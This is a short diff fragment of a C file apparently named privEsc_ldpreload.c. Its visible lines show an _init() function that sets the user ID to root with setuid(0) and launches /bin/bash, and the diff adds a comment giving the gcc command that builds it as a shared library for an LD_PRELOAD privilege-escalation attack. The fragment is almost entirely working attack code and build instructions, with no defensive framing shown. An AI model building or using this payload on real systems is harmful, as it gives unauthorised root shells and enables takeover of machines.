@@ -8,3 +8,5 @@ void _init() {
   setuid(0);
   system("/bin/bash");
 }
+
+// Compile with "gcc -fPIC -shared -o shell.so privEsc_ldpreload.c -nostartfiles"
